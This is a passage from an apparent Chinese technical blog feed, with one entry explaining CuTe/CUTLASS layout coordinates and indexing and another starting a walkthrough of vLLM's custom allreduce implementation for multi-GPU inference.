class="hljs-number">0</span>; m &lt; <span class="hljs-built_in">size</span>&lt;<span class="hljs-number">0</span>&gt;(layout); ++m) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> n = <span class="hljs-number">0</span>; n &lt; <span class="hljs-built_in">size</span>&lt;<span class="hljs-number">1</span>&gt;(layout); ++n) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3d  &quot;</span>, <span class="hljs-built_in">layout</span>(m,n));<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的程序中，我们使用 <code>size&lt;0&gt;(layout)</code> 和 <code>size&lt;1&gt;(layout)</code> 分别获得第一维和第二维的大小。<code>layout(m, n)</code> 指向了第 m 行 n 列的元素索引。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">Stride</span>&gt;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print1D</span><span class="hljs-params">(Layout&lt;Shape,Stride&gt; <span class="hljs-type">const</span>&amp; layout)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">size</span>(layout); ++i) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3d  &quot;</span>, <span class="hljs-built_in">layout</span>(i));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>也可以直接使用 <code>size</code> 函数获得所有维度的总数。<code>layout(i)</code> 则从一维的视角来排布元素，顺序是列主序，从上到下，从左到右。</p><p>下面是运行后的结果：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs tap">&gt; print2D(s2xd4)<br> <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 2 </span>  <span class="hljs-number"> 4 </span>   6<br> <span class="hljs-number"> 1 </span>  <span class="hljs-number"> 3 </span>  <span class="hljs-number"> 5 </span>   7<br>&gt; print2D(s2xd4_col)<br> <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 2 </span>  <span class="hljs-number"> 4 </span>   6<br> <span class="hljs-number"> 1 </span>  <span class="hljs-number"> 3 </span>  <span class="hljs-number"> 5 </span>   7<br>&gt; print2D(s2xd4_row)<br> <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 1 </span>  <span class="hljs-number"> 2 </span>   3<br> <span class="hljs-number"> 4 </span>  <span class="hljs-number"> 5 </span>  <span class="hljs-number"> 6 </span>   7<br>&gt; print1D(s2xd4)<br> <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 1 </span>  <span class="hljs-number"> 2 </span>  <span class="hljs-number"> 3 </span>  <span class="hljs-number"> 4 </span>  <span class="hljs-number"> 5 </span>  <span class="hljs-number"> 6 </span>   7<br>&gt; print1D(s2xd4_col)<br> <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 2 </span>  <span class="hljs-number"> 4 </span>   6<br> <span class="hljs-number"> 1 </span>  <span class="hljs-number"> 3 </span>  <span class="hljs-number"> 5 </span>   7<br>&gt; print1D(s2xd4_row)  <br> <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 1 </span>  <span class="hljs-number"> 2 </span>  <span class="hljs-number"> 3 </span><br> <span class="hljs-number"> 4 </span>  <span class="hljs-number"> 5 </span>  <span class="hljs-number"> 6 </span>   7<br></code></pre></td></tr></table></figure><h3 id="Layout-坐标与索引">Layout 坐标与索引</h3><p>刚才我们给出的例子都是二维的矩阵，事实上一维 vector 也是可以用 CuTe 表示的，只不过 Layout 维度 rank == 1。例如，Layout 8:1 就是 8 个元素的连续 vector</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Layout</span>:  <span class="hljs-number">8</span>:<span class="hljs-number">1</span><br><span class="hljs-attribute">Coord</span> :  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span><br><span class="hljs-attribute">Index</span> :  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>这里我们开始引入 Coord 坐标来表示数据在 Tensor 的相对位置。因此 Coord 的数字都从0开始，到最后最大不超过 Tensor 的元素个数。</p><p>使用 index 索引来表示数据在内存上的位置，因为 Tensor 可能不是连续的，所以它的值有时会大于元素个数，我们之前使用 <code>print_layout</code> 和 <code>layout</code> 例子中，打印出来的都是 index。</p><p>相似的，Layout 8:2 中，Coord 是不变的（仍然是 8 个元素），但 index 因为 Stride 为 2，内存上会空一个存一个数据：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Layout</span>:  <span class="hljs-number">8</span>:<span class="hljs-number">2</span><br><span class="hljs-attribute">Coord</span> :  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span><br><span class="hljs-attribute">Index</span> :  <span class="hljs-number">0</span>  <span class="hljs-number">2</span>  <span class="hljs-number">4</span>  <span class="hljs-number">6</span>  <span class="hljs-number">8</span> <span class="hljs-number">10</span> <span class="hljs-number">12</span> <span class="hljs-number">14</span><br></code></pre></td></tr></table></figure><p>所有的多维矩阵在内存上都是一维存储的。要想将二维 Layout 要转化为一维 vector ，需要在最外层套上一层括号，即将 (4,2):(2,1) 改写为 ((4,2)):((2,1))。顺序是列主序，从第一列开始拆解，从上到下从左到右一个个按序写入：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs tap">Layout:  ((4,2)):((2,1))<br>     <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span><br>    +---+---+<br><span class="hljs-number"> 0 </span> |<span class="hljs-number"> 0 </span>|<span class="hljs-number"> 1 </span>|<br>    +---+---+<br><span class="hljs-number"> 1 </span> |<span class="hljs-number"> 2 </span>|<span class="hljs-number"> 3 </span>|<br>    +---+---+<br><span class="hljs-number"> 2 </span> |<span class="hljs-number"> 4 </span>|<span class="hljs-number"> 5 </span>|<br>    +---+---+<br><span class="hljs-number"> 3 </span> |<span class="hljs-number"> 6 </span>|<span class="hljs-number"> 7 </span>|<br>    +---+---+<br>Coord : <span class="hljs-number"> 0 </span><span class="hljs-number"> 1 </span><span class="hljs-number"> 2 </span><span class="hljs-number"> 3 </span><span class="hljs-number"> 4 </span><span class="hljs-number"> 5 </span><span class="hljs-number"> 6 </span> 7<br>Index : <span class="hljs-number"> 0 </span><span class="hljs-number"> 2 </span><span class="hljs-number"> 4 </span><span class="hljs-number"> 6 </span><span class="hljs-number"> 1 </span><span class="hljs-number"> 3 </span><span class="hljs-number"> 5 </span> 7<br><br>Layout:  ((4,2)):((1,4))<br>     <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span><br>    +---+---+<br><span class="hljs-number"> 0 </span> |<span class="hljs-number"> 0 </span>|<span class="hljs-number"> 4 </span>|<br>    +---+---+<br><span class="hljs-number"> 1 </span> |<span class="hljs-number"> 1 </span>|<span class="hljs-number"> 5 </span>|<br>    +---+---+<br><span class="hljs-number"> 2 </span> |<span class="hljs-number"> 2 </span>|<span class="hljs-number"> 6 </span>|<br>    +---+---+<br><span class="hljs-number"> 3 </span> |<span class="hljs-number"> 3 </span>|<span class="hljs-number"> 7 </span>|<br>    +---+---+<br>Coord : <span class="hljs-number"> 0 </span><span class="hljs-number"> 1 </span><span class="hljs-number"> 2 </span><span class="hljs-number"> 3 </span><span class="hljs-number"> 4 </span><span class="hljs-number"> 5 </span><span class="hljs-number"> 6 </span> 7<br>Index : <span class="hljs-number"> 0 </span><span class="hljs-number"> 1 </span><span class="hljs-number"> 2 </span><span class="hljs-number"> 3 </span><span class="hljs-number"> 4 </span><span class="hljs-number"> 5 </span><span class="hljs-number"> 6 </span> 7<br></code></pre></td></tr></table></figure><p>除了简单的数字坐标外，还有更复杂但更易理解的多维坐标。之前提过，一维坐标是将矩阵以列主序的方式从上到下从左到右；二维坐标则使用行号列号两个数字做寻找，而自然坐标则与 tensor layout 的形式完全一致。数学上，自然坐标与 Stride 做内积可以得到 index 索引。</p><h3 id="例六">例六</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> shape = Shape&lt;_3,Shape&lt;_2,_3&gt;&gt;&#123;&#125;;<br><span class="hljs-keyword">auto</span> stride = Stride&lt;_3, Stride&lt;_12, _1&gt;&gt;&#123;&#125;;<br>Layout t = <span class="hljs-built_in">make_layout</span>(shape, stride);<br><span class="hljs-built_in">print_layout</span>(t);<br><br><span class="hljs-comment">// index layout 方法寻址</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3d  &quot;</span>, <span class="hljs-built_in">t</span>(<span class="hljs-number">17</span>));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3d  &quot;</span>, <span class="hljs-built_in">t</span>(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>));<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">Layout (3, (2, 3)):(3, (12, 1))<br>      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 1 </span>   <span class="hljs-number"> 2 </span>   <span class="hljs-number"> 3 </span>   <span class="hljs-number"> 4 </span>    5<br>    +-----+-----+-----+-----+-----+-----+<br><span class="hljs-number"> 0 </span> | <span class="hljs-number"> 0 </span> | <span class="hljs-number"> 12 </span>| <span class="hljs-number"> 1 </span> | <span class="hljs-number"> 13 </span>| <span class="hljs-number"> 2 </span> | <span class="hljs-number"> 14 </span>|<br>    +-----+-----+-----+-----+-----+-----+<br><span class="hljs-number"> 1 </span> | <span class="hljs-number"> 3 </span> | <span class="hljs-number"> 15 </span>| <span class="hljs-number"> 4 </span> | <span class="hljs-number"> 16 </span>| <span class="hljs-number"> 5 </span> | <span class="hljs-number"> 17 </span>|<br>    +-----+-----+-----+-----+-----+-----+<br><span class="hljs-number"> 2 </span> | <span class="hljs-number"> 6 </span> | <span class="hljs-number"> 18 </span>| <span class="hljs-number"> 7 </span> | <span class="hljs-number"> 19 </span>| <span class="hljs-number"> 8 </span> | <span class="hljs-number"> 20 </span>|<br>    +-----+-----+-----+-----+-----+-----+<br>20   20<br></code></pre></td></tr></table></figure><p>使用 coord 坐标寻址，需要将索引转换为坐标：使用 <code>idx2crd</code> 函数将索引转换为 coord，由于索引转坐标时仅需要 shape 就可以确认，因此需要传入 shape：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">idx2crd</span>(<span class="hljs-number">17</span>, shape));<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">idx2crd</span>(Int&lt;<span class="hljs-number">17</span>&gt;&#123;&#125;, shape));<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">idx2crd</span>(<span class="hljs-built_in">make_coord</span>(_2&#123;&#125;, _5&#123;&#125;), shape));<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clojure">(<span class="hljs-number">2</span><span class="hljs-punctuation">,</span>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span>))<br>(<span class="hljs-name">_2</span><span class="hljs-punctuation">,</span>(<span class="hljs-name">_1</span><span class="hljs-punctuation">,</span>_2))<br>(<span class="hljs-name">_2</span><span class="hljs-punctuation">,</span>(<span class="hljs-name">_1</span><span class="hljs-punctuation">,</span>_2))<br></code></pre></td></tr></table></figure><p>因此，对于Tensor中的索引 17，有如下坐标：</p><p>Coord: (2, (1, 2))</p><p>如果我们多增加一些索引转换为坐标的例子，那么我们就可以得到如下的索引与坐标映射图：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">Layout (3, (2, 3)):(3, (12, 1))<br>      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 1 </span>   <span class="hljs-number"> 2 </span>   <span class="hljs-number"> 3 </span>   <span class="hljs-number"> 4 </span>   <span class="hljs-number"> 5 </span>    &lt;== 1-D col coord<br>     (0,0) (1,0) (0,1) (1,1) (0,2) (1,2)   &lt;== 2-D col coord (j,k)<br>    +-----+-----+-----+-----+-----+-----+<br><span class="hljs-number"> 0 </span> | <span class="hljs-number"> 0 </span> | <span class="hljs-number"> 12 </span>| <span class="hljs-number"> 1 </span> | <span class="hljs-number"> 13 </span>| <span class="hljs-number"> 2 </span> | <span class="hljs-number"> 14 </span>|<br>    +-----+-----+-----+-----+-----+-----+<br><span class="hljs-number"> 1 </span> | <span class="hljs-number"> 3 </span> | <span class="hljs-number"> 15 </span>| <span class="hljs-number"> 4 </span> | <span class="hljs-number"> 16 </span>| <span class="hljs-number"> 5 </span> | <span class="hljs-number"> 17 </span>|<br>    +-----+-----+-----+-----+-----+-----+<br><span class="hljs-number"> 2 </span> | <span class="hljs-number"> 6 </span> | <span class="hljs-number"> 18 </span>| <span class="hljs-number"> 7 </span> | <span class="hljs-number"> 19 </span>| <span class="hljs-number"> 8 </span> | <span class="hljs-number"> 20 </span>|<br>    +-----+-----+-----+-----+-----+-----+<br></code></pre></td></tr></table></figure><h3 id="例七">例七</h3><p>在 CuTe 中，可使用 <code>idx2crd</code> 将索引转换到坐标：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> shape = Shape&lt;_3,Shape&lt;_2,_3&gt;&gt;&#123;&#125;;<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">idx2crd</span>(   <span class="hljs-number">16</span>, shape));                                <span class="hljs-comment">// (1,(1,2))</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">idx2crd</span>(_16&#123;&#125;, shape));                                <span class="hljs-comment">// (_1,(_1,_2))</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">idx2crd</span>(<span class="hljs-built_in">make_coord</span>(   <span class="hljs-number">1</span>,<span class="hljs-number">5</span>), shape));                   <span class="hljs-comment">// (1,(1,2))</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">idx2crd</span>(<span class="hljs-built_in">make_coord</span>(_1&#123;&#125;,<span class="hljs-number">5</span>), shape));                   <span class="hljs-comment">// (_1,(1,2))</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">idx2crd</span>(<span class="hljs-built_in">make_coord</span>(   <span class="hljs-number">1</span>,<span class="hljs-built_in">make_coord</span>(<span class="hljs-number">1</span>,   <span class="hljs-number">2</span>)), shape));  <span class="hljs-comment">// (1,(1,2))</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">idx2crd</span>(<span class="hljs-built_in">make_coord</span>(_1&#123;&#125;,<span class="hljs-built_in">make_coord</span>(<span class="hljs-number">1</span>,_2&#123;&#125;)), shape));  <span class="hljs-comment">// (_1,(1,_2))</span><br></code></pre></td></tr></table></figure><p>亦可使用 <code>crd2idx</code> 将坐标转换为索引：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> shape  = Shape &lt;_3,Shape&lt;  _2,_3&gt;&gt;&#123;&#125;;<br><span class="hljs-keyword">auto</span> stride = Stride&lt;_3,Stride&lt;_12,_1&gt;&gt;&#123;&#125;;<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">crd2idx</span>(   <span class="hljs-number">16</span>, shape, stride));       <span class="hljs-comment">// 17</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">crd2idx</span>(_16&#123;&#125;, shape, stride));       <span class="hljs-comment">// _17</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">crd2idx</span>(<span class="hljs-built_in">make_coord</span>(   <span class="hljs-number">1</span>,   <span class="hljs-number">5</span>), shape, stride));  <span class="hljs-comment">// 17</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">crd2idx</span>(<span class="hljs-built_in">make_coord</span>(_1&#123;&#125;,   <span class="hljs-number">5</span>), shape, stride));  <span class="hljs-comment">// 17</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">crd2idx</span>(<span class="hljs-built_in">make_coord</span>(_1&#123;&#125;,_5&#123;&#125;), shape, stride));  <span class="hljs-comment">// _17</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">crd2idx</span>(<span class="hljs-built_in">make_coord</span>(   <span class="hljs-number">1</span>,<span class="hljs-built_in">make_coord</span>(   <span class="hljs-number">1</span>,   <span class="hljs-number">2</span>)), shape, stride));  <span class="hljs-comment">// 17</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">crd2idx</span>(<span class="hljs-built_in">make_coord</span>(_1&#123;&#125;,<span class="hljs-built_in">make_coord</span>(_1&#123;&#125;,_2&#123;&#125;)), shape, stride));  <span class="hljs-comment">// _17</span><br></code></pre></td></tr></table></figure><p>CuTe 还支持 Tensor 的一维或多维索引，在本例中，如果我们要索引到 5 这个数字，那么可以通过 Tensor(4) 或者 Tensor(1, 1) 来获得。我们来看一个更复杂的例子</p><h3 id="Layout-兼容">Layout 兼容</h3><p>如果布局A和布局B的形状是兼容的，那么它们就是兼容的。如果A的任何自然坐标也是B的有效坐标，则形状A与形状B兼容。</p><p>Flatten<br>“Flatten”操作“un-nest”可能嵌套的Layout。例如</p><h1>Layout 代数学</h1>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
      <tag>CUTLASS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VLLM custom allreduce 实现</title>
    <link href="/2024/08/02/2024-10-30-vllm/"/>
    <url>/2024/08/02/2024-10-30-vllm/</url>
    
    <content type="html"><![CDATA[<h1>vllm custom allreduce 实现</h1><h2 id="动机">动机</h2><p>用过 vllm 执行大模型的读者应该很清楚， vllm 使用张量并行（tensor parallel）的方式执行多卡推理。在 Self-Attention 和 MLP 层会将张量分布到各个 GPU worker 上计算，因此各个 GPU 上计算的只是一部分矩阵乘的数据，故完成计算后所有的 GPU worker 需要将结果“汇总”起来，即执行 allreduce，才能获得所有的结果，进而开始后续的操作（比如 dropout 或者 layernorm）。</p><p><img src="https://qiankunli.github.io/public/upload/machine/gpu_all_reduce.png" alt="allreduce 示例"></p><p>也就是说，执行一次有 N 层 LLM 的推理，多个 GPU worker 间就需要执行至少 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>×</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">2\times N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 次 allreduce。考虑到 N 通常为 32-128 之间，且执行 allreduce 会阻塞后续模型的推理进度，因此 allreduce 性能会直接影响 vllm 多卡推理的效率。</p><p>而在 decoding 阶段，对于一个 sequence 来说，vllm 的一次推理只会推出一个 token，因此 decoding 阶段的 allreduce 的通信的数据量非常小。我们以 llama2-70b 模型在推理 batch size 为 32 时的场景为例，其decoding 阶段需要的 allreduce 通信数据量仅为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>32</mn><mo>×</mo><mn>8192</mn><mo>×</mo><mn>2</mn><mo>=</mo><mn>512</mn></mrow><annotation encoding="application/x-tex">32\times 8192 \times 2=512</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">32</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">8192</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">512</span></span></span></span> KB。可见即使在 70B 大模型上运行较大的 batch size 所带来的通信量也是非常少的。</p><p>在没有 vllm custom allreduce 时，我们会直接使用 nvidia GPU 的 NCCL 通信库来完成 allreduce。但是，对于上述小 size 的 allreduce 场景，NCCL 存在以下问题：</p><ol><li>多 stage，不是延迟最优的。NCCL 实现的带宽最优的树或环状 allreduce（具体实现可以参考 <a href="https://mp.weixin.qq.com/s/K8l7H2zCUr9sGzYehizFMA">Ring Allreduce</a>，它们分别具有 O(logn) 和 O(n) 个阶段传输过程（n 为 GPU 数）。考虑到现代 nvidia GPU 间的巨大带宽（A100 的有效双向带宽有 480 GB/s ！）， NCCL 实现的 allreduce 显然更适合大数据传输的场景，对于小 size 场景，我们更希望其延迟中的启动传输（或同步）时间更少，而不必担心数据真正的传输时间太长。</li><li>不利于内核融合。NCCL 对于 vllm 开发人员来说是黑盒，很难被进一步融合优化。而如果 vllm 使用自己的内核，那么就能更轻松地做算子融合操作</li><li>CUDA graph 不友好。NCCL 的 cuda graph 需要插入同步主机的节点，这会阻塞 GPU，导致 GPU 流出现间隙：</li></ol><p><img src="/img/LLM/nccl_cuda.png" alt=""></p><h2 id="机制">机制</h2><h3 id="缓冲区注册">缓冲区注册</h3><p>CUDA IPC (Interprocess Communication) 支持每个 GPU 节点拥有一个指向其他 GPU 节点内存的指针。显然，我们可以使用这些指针来完成 allreduce 操作。具体步骤是，首先在初始化的过程中就先将每个节点的一个 buffer 暴露给其他节点，组成一个 IPC handle，然后在做 allreduce 时，节点只需要从其他所有节点的 buffer 中读取数据即可。</p><h3 id="one-shot-allreduce">one-shot allreduce</h3><p>allreduce 有非常多算法。在小 size 场景下，为尽可能减少 GPU 同步和收发时间，我们当然希望直接了当一些：直接让所有节点的数据同时广播给其他节点。这就是 one-shot allreduce</p><p><img src="/img/LLM/one_shot_allreduce.png" alt=""></p><p>one-shot allreduce 的性能关键设计一个自定义对齐数据类型，方便让每个节点能都快速地读取 allreduce 数据。最好是 128 bits 对齐，因为每个 CUDA 线程一次会读取 16 字节，好让编译器生成 <code>LD.128</code> 和 <code>ST.128</code> 指令。</p><h3 id="two-hop-allreduce">two-hop allreduce</h3><p>在稍微大一些的 size 或节点稍多的场景下，直接让所有节点广播就不太合适了。two-shot allreduce 先执行 reduce scatter，让每个节点从所有节点那读取对应的 1/N 的数据，然后加起来。然后，在做一个 allgather，将所有节点的数据发送给其他节点。</p><p><img src="/img/LLM/two_shot_allreduce.png" alt=""></p><h1>代码解读</h1><p>本博文涉及的 vllm 代码为 0.6.3，请注意时效性。</p><h2 id="python-开始">python 开始</h2><h3 id="Linear-层到-allreduce">Linear 层到 allreduce</h3><p>首先，让我们回到最初的地方，当多卡 TP 执行推理时，计算 MLP down_proj 等会涉及到了我们目前研究的 custom allreduce：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RowParallelLinear</span>(<span class="hljs-title class_ inherited__">LinearBase</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, input_</span>):<br>        <span class="hljs-comment"># ...</span><br>        bias_ = <span class="hljs-literal">None</span> <span class="hljs-keyword">if</span> (self.tp_rank &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> self.skip_bias_add) <span class="hljs-keyword">else</span> self.bias<br>        output_parallel = self.quant_method.apply(self,<br>                                                  input_parallel,<br>                                                  bias=bias_)<br>        <span class="hljs-keyword">if</span> self.reduce_results <span class="hljs-keyword">and</span> self.tp_size &gt; <span class="hljs-number">1</span>:<br>            output = tensor_model_parallel_all_reduce(output_parallel)<br>        <span class="hljs-keyword">else</span>:<br>            output = output_parallel<br>        <span class="hljs-comment"># ...</span><br>        <span class="hljs-keyword">return</span> output, output_bias<br></code></pre></td></tr></table></figure><p>该函数的实现在 vllm/distributed 内</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">tensor_model_parallel_all_reduce</span>(<span class="hljs-params">input_: torch.Tensor</span>) -&gt; torch.Tensor:<br>    <span class="hljs-string">&quot;&quot;&quot;All-reduce the input tensor across model parallel group.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> get_tp_group().all_reduce(input_)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_tp_group</span>() -&gt; GroupCoordinator:<br>    <span class="hljs-keyword">assert</span> _TP <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>, (<span class="hljs-string">&quot;tensor model parallel group is not initialized&quot;</span>)<br>    <span class="hljs-keyword">return</span> _TP<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">all_reduce</span>(<span class="hljs-params">self, input_: torch.Tensor</span>) -&gt; torch.Tensor:<br>    <span class="hljs-comment"># ...</span><br>    <span class="hljs-comment"># use custom allreduce</span><br>    <span class="hljs-keyword">return</span> torch.ops.vllm.outplace_all_reduce(input_, group_name=self.unique_name)<br></code></pre></td></tr></table></figure><p>最终，经过几次辗转调用后，python 代码最终接入到 <code>CustomAllreduce</code> 类的地方就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span 